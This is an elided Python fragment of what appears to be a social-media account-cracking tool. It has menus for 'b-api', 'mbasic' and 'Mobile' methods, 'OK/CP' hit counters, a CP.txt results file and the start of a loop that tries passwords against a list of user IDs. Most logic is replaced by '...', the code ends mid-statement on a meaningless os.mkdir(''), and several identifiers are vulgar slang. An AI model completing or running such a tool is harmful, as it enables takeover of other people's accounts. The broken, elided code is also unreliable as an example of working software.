...
class __crack__:
	...
	def plerr(self):
		...
		if _jokowi_kontol_ in ('M', 'm'):
				...
				if pwek == '':
					...
					def _sempak_(bse=None):
						...
						if boy == '':
							...
							NEXUS('[•] Result CP saved to CP.txt')
							NEXUS('\n\tCrack Processing...\n')
							NEXUS('\n\tCrack Processing...\n\n');logo()
							...
							exit()
					NEXUS('\n01.) Metode b-api ')
					NEXUS('02.) Metode mbasic ')
					NEXUS('03.) Metode Mobile ')
					_sempak_(pwek.split(','))
					break
			...
			NEXUS('\n\t------[ Method Crack ]-----')
			print (' [*]=============================================')
			NEXUS(' [1] AKING Method 1 ')
			NEXUS(' [2] AKING Method 2  [ Pro ]')
			NEXUS(' [3] AKING Method 3   ')
			print (' [*]=============================================')
			self.__pler__()
		else:
			exit()
	...
	def __api__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;97m [NEXUS] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
